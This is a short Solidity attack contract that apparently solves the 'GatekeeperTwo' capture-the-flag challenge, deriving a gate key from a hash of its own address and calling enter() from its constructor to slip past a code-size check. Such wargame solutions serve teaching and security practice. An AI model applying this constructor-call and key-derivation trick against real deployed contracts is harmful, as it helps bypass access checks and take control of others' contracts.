pragma solidity ^0.4.18;

interface GatekeeperTwo{
    function enter(bytes8) public;
}

contract GatekeeperTwoAttack {
    function GatekeeperTwoAttack(address _addr){
        uint64 gateKey = uint64(keccak256(address(this))) ^ (uint64(0) - 1);
        GatekeeperTwo(_addr).enter(bytes8(gateKey));
    }
}